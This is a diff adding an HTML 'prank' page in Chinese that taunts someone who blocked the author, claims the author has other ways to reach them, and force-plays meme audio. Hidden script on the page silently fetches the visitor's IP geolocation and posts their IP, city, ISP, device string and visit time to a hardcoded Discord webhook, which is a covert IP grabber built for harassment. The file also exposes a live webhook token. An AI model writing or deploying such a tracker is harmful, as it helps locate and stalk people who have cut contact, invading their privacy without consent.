@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>来自你爹的回应</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: #f1f1f1;
+      text-align: center;
+      padding: 10%;
+      margin: 0;
+    }
+    .box {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 30px;
+      border-radius: 16px;
+      max-width: 600px;
+      margin: auto;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .ip, .extra {
+      margin-top: 20px;
+      color: #00ff99;
+      font-family: monospace;
+    }
+    h2 {
+      color: #ff6666;
+      animation: shake 0.5s infinite;
+    }
+    
+    @keyframes shake {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(-2px); }
+      50% { transform: translateX(2px); }
+      75% { transform: translateX(-2px); }
+      100% { transform: translateX(0); }
+    }
+    
+    .emoji {
+      animation: bounce 1s infinite;
+      display: inline-block;
+    }
+    
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    .rainbow {
+      background: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3);
+      background-size: 400% 400%;
+      animation: rainbow 2s ease infinite;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    
+    @keyframes rainbow {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+  </style>
+</head>
+<body>
+  <!-- 鬼畜音效播放器 -->
+  <audio id="bgMusic" autoplay preload="auto" controls style="display:none;" volume="0.8">
+    <source src="https://files.catbox.moe/8x9wqo.mp3" type="audio/mpeg">
+    <source src="https://files.catbox.moe/kd4499.mp3" type="audio/mpeg">
+    <source src="https://files.catbox.moe/osrhy0.mp3" type="audio/mpeg">
+    <source src="https://files.catbox.moe/rpp8ez.mp3" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+  
+
+
+  <div class="box">
+      <h2 class="rainbow">你以为你跑得掉？<span class="emoji">🤡</span></h2>
+      <p>你拉黑得太快，连句<span class="rainbow">"哈喽"</span>都没让我说完。</p>
+      <p>不过……我可不是那么容易被甩掉的人 <span class="emoji">🕵️‍♂️</span></p>
+      <p><span class="emoji">🎵</span> <span class="rainbow">你干嘛～哎哟～</span> <span class="emoji">🎵</span></p>
+      <p><span class="rainbow">你以为拉黑我就完事了？</span> <span class="emoji">😏</span></p>
+       <p>我告诉你，<span class="rainbow">我有的是办法联系你！</span></p>
+       <p>说完哈喽就把我拉黑，<span class="rainbow">这样不太好吧？</span> <span class="emoji">😤</span></p>
+      <p style="margin-top: 20px; font-size: 14px; color: #888;">🎶 正在播放鬼畜音效 🎶</p>
+    </div>
+
+  <script>
+    const startTime = Date.now();
+    
+    // 鬼畜音效库 - 多个搞笑音频源
+    const audioSources = [
+      'https://files.catbox.moe/8x9wqo.mp3',  // 你干嘛哎哟
+      'https://files.catbox.moe/kd4499.mp3',  // 鬼畜音效1
+      'https://files.catbox.moe/osrhy0.mp3',  // 鬼畜音效2
+      'https://files.catbox.moe/rpp8ez.mp3'   // 原音频
+    ];
+    
+    let currentAudioIndex = 0;
+    const bgMusic = document.getElementById('bgMusic');
+    
+    // 随机选择音频并播放
+    function playRandomAudio() {
+      currentAudioIndex = Math.floor(Math.random() * audioSources.length);
+      const audioSource = bgMusic.querySelector('source');
+      audioSource.src = audioSources[currentAudioIndex];
+      bgMusic.volume = 0.8;
+      bgMusic.load();
+      
+      // 强制播放音频
+      bgMusic.play().then(() => {
+        console.log('🎵 鬼畜音效开始播放！');
+      }).catch(error => {
+        console.log('音频播放失败');
+        // 如果自动播放失败，尝试静音播放
+        bgMusic.muted = true;
+        bgMusic.play().then(() => {
+          // 延迟取消静音
+          setTimeout(() => {
+            bgMusic.muted = false;
+          }, 1000);
+        }).catch(() => {
+          // 如果还是失败，等待用户交互
+          setTimeout(() => {
+            bgMusic.play();
+          }, 100);
+        });
+      });
+    }
+    
+    // 音频结束时切换到下一个
+    bgMusic.addEventListener('ended', () => {
+      setTimeout(() => {
+        playRandomAudio();
+      }, 500);
+    });
+    
+    // 页面加载完成后立即播放
+    window.addEventListener('load', () => {
+      playRandomAudio();
+    });
+    
+    // 立即尝试播放
+    setTimeout(() => {
+      playRandomAudio();
+    }, 100);
+    
+    // 添加更多触发播放的事件
+    document.addEventListener('DOMContentLoaded', () => {
+      playRandomAudio();
+    });
+    
+    // 用户交互后播放
+    document.addEventListener('click', () => {
+      if (bgMusic.paused) {
+        playRandomAudio();
+      }
+    }, { once: true });
+    
+    document.addEventListener('touchstart', () => {
+      if (bgMusic.paused) {
+        playRandomAudio();
+      }
+    }, { once: true });
+    
+    document.addEventListener('keydown', () => {
+      if (bgMusic.paused) {
+        playRandomAudio();
+      }
+    }, { once: true });
+    
+    // 页面可见时播放
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden && bgMusic.paused) {
+        playRandomAudio();
+      }
+    });
+    
+    // 确保音频循环播放
+    bgMusic.addEventListener('loadstart', () => {
+      bgMusic.loop = false; // 关闭loop，用ended事件控制
+    });
+    
+    // 后台获取IP信息（不显示给用户）
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const device = navigator.userAgent;
+        const now = new Date().toLocaleString();
+        const staySeconds = Math.floor((Date.now() - startTime) / 1000);
+
+        const info = `📡 新访客信息：\nIP: ${data.ip}\n城市: ${data.city}\n地区: ${data.region}\n国家: ${data.country_name}\nISP: ${data.org}\n设备: ${device}\n访问时间: ${now}\n停留时长: ${staySeconds}秒\n🎵 正在播放鬼畜音效: ${audioSources[currentAudioIndex]}`;
+
+        // 发送到Discord但不显示给用户
+        const payload = {
+          content: info
+        };
+
+        fetch("https://discord.com/api/webhooks/1390342240341200896/q347jv1coE-Ey9mVlW5_m8N33_ehxeyGZdFIJHBnYXBvQUg1OfUUH047zeIUwpNkvUQB", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+      })
+      .catch(err => {
+        console.log('IP获取失败');
+      });
+  </script>
+</body>
+</html>
